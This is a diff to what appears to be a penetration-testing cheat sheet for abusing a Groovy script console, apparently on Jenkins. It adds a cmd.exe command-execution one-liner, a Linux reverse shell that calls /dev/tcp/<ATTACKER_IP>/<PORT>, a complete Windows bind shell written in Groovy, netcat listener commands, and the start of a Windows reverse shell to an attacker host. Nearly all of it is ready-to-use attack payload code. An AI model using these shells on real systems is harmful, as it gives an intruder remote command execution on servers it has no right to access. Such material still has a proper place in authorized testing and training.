@@ -179,22 +179,23 @@ sudo nmap -sV -p 5000,8080 <TARGET>
 
 ### Script Console
 
-#### Linux
+Typically uses Groovy (language) to execute commands:
 
 ```groovy
-# Execute System Command
-def cmd = '<COMMAND>'
-def sout = new StringBuffer(), serr = new StringBuffer()
-def proc = cmd.execute()
-proc.consumeProcessOutput(sout, serr)
-proc.waitForOrKill(1000)
-println sout
+println "cmd.exe /c <COMMAND>".execute().text
+```
+
+### Groovy Shells
+
+#### Linux
+
+##### Reverse
+
+```bash
+nc -lvnp <PORT>
 ```
 
 ```groovy
-nc -lvnp <PORT>
-
-# Reverse Shell Callback
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
@@ -202,10 +203,36 @@ p.waitFor()
 
 #### Windows
 
-```groovy
-nc -lvnp <PORT>
+##### Bind
 
-# Reverse Shell Callback
+```groovy
+int port=<PORT>;
+String cmd="cmd.exe";
+ServerSocket ss=new ServerSocket(port);
+Socket s=ss.accept();
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+InputStream pi=p.getInputStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()>0)so.write(pi.read());
+  while(si.available()>0)po.write(si.read());
+  so.flush();po.flush();Thread.sleep(50);
+  try{p.exitValue();break;}catch(Exception e){}
+};
+p.destroy();s.close();ss.close();
+```
+
+```bash
+nc -nv <TARGET> <PORT>
+```
+
+##### Reverse
+
+```bash
+nc -lvnp <PORT>
+```
+
+```groovy
 String host="<ATTACKER_IP>";
 int port=<PORT>;
 String cmd="cmd.exe";
